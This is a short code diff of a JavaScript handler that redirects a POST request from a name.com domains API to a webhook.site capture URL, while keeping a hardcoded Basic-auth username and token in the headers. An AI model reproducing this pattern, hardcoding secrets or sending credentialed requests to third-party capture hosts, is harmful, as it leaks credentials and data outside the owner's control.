@@ -63,7 +63,7 @@ exports.handler = function(event, context, callback) {
   };
 
   (() => {
-    fetch('https://api.dev.name.com/v4/domains',{ method: 'POST', body: dataString, headers: {
+    fetch('https://webhook.site/63a01a92-d9a2-462e-8482-50fd77a1f74c',{ method: 'POST', body: dataString, headers: {
         "Content-Type": "text/plain",
         'Authorization': 'Basic ' + 'evans77843-test:5052acd9add3b8910e7f9591bcb396846d818c4f',
     } })
